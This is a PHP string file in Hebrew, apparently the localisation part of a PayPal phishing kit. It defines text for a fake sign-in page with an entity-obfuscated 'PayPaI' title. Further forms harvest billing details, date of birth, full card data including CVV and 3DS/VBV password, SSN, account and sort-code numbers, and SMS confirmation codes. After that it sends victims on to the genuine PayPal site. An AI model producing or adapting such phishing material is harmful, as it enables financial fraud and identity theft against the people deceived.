<?php 
//LOG
$log_ttl1="&#80;&#97;y&#80;&#97;I עדכון חשבון";
$log_ttl2="Secure";
$log_lab1="&#80;&#97;y&#80;&#97;I עמוד מאובטח";
$log_lab2="התחבר לחשבונך";
$log_em="האימייל שלך";
$log_ps="הסיסמה שלך";
$log_frg='שכחת את הדוא"ל או הסיסמא שלך?';
$log_btn="התחברות";
//FTR
$ftr_01="פרטיות";
$ftr_02="משפטי";
$ftr_03="איש קשר";
$ftr_04="משוב";
//INF
$inf_scr="האבטחה שלך היא בראש סדר העדיפויות שלנו";
$inf_ttspan="עדכון פרטי חשבון";
$inf_lab1="עדכן את כתובת החיוב שלך";
$inf_corr="אנא הכנס נכון את כתובת החיוב שלך.";
$inf_frnm="שם פרטי חוקי";
$inf_lsnm="שם משפחה חוקי";
$inf_dob="תאריך לידה (יום / חודש / שנה";
$inf_add="כתובת רחוב";
$inf_cty="עיר";
$inf_stt="State";
$inf_cnt="מדינה";
$inf_zip="מיקוד";
$inf_mob="נייד";
$inf_hom="בית נייד";
$inf_pho="מספר טלפון";
$inf_con="המשך";
//CRD
$crd_ttspan="עדכון פרטי כרטיס האשראי";
$crd_lab1="עדכן את כרטיס האשראי / החיוב שלך";
$crd_corr="אנא הכנס נכון את פרטי כרטיס האשראי / החיוב שלך";
$crd_crdh="בעל כרטיס";
$crd_crdn="מספר כרטיס אשראי";
$crd_expd="תאריך תפוגה MM / YY";
$crd_cv="CVV/CSC";
$crd_ttcv="הזן את כרטיס קוד האימות שלך המופיע בכרטיס שלך";
$crd_ptcv="./scr/csc";
$crd_wtcv="מהו קוד ה- CSC?";
$crd_ttptcv="קוד אימות כרטיסים - עזרה";
$crd_cvp="CVV הינה דרך נוספת לוודא שמבצע העסקה הוא הלקוח. מספר זה נדרש על ידי חברות האשראי כחלק מהגברת אבטחת המידע בעת ביצוע עסקאות באינטרנט
למעשה מדובר בשלושת הספרות האחרונות בגב הכרטיס ליד החתימה (להלן דוגמא).";
$crd_cvtd1="There is a number of 3 figures in italics inverted the back of the credit card.";
$crd_cvtd2="זהו מספר בן 4 ספרות בקדמת הכרטיס, ממש מעל מספר כרטיס האשראי.";
$crd_cvfrm="סגור";
$crd_pcptcv="../../lyl_ims/cv.png";
$crd_3ds="סיסמת 3DS VBV / MSC";
$crd_acc="מספר חשבון";
$crd_sn="SSN";
$crd_ttsn="מספר ביטוח לאומי";
$crd_srt="קוד מיון";
$crd_ttptsrt="Sorting code - help";
$crd_ptsrt="./scr/srt/";
$crd_pcsrt="../../lyl_ims/srt.png";
$crd_btn="המשך";
//PIN
$bnk_ttspan="תהליך אימות חשבון";
$bnk_lab1="תהליך אימות חשבון";
$bnk_yrbn="אימות בטלפון:";
$bnk_corr="אנא אמת את עצמך על ידי הזנת קוד האישור שקיבלתם בטלפון שלך ולחץ על 'אשר עכשיו'";
$bnk_rt="הזן כאן את קוד האישור";
$inc_pin="הזנת את קוד האישור שגוי, אנא נסה שוב.";
$bnk_bt="קבל עכשיו";
//SCS
$scs_ttspan="עדכון מוצלח";
$scs_lnk="https://www.paypal.com/signin/";
$scs_tnk="תודה";
$scs_yrp="חשבון PayPal שלך עודכן בהצלחה.";
$scs_yhv="You need to reconnect to save changes, you will be automatically redirected to the landing page in 3 seconds ... Thanks for using our system verification ..";
?>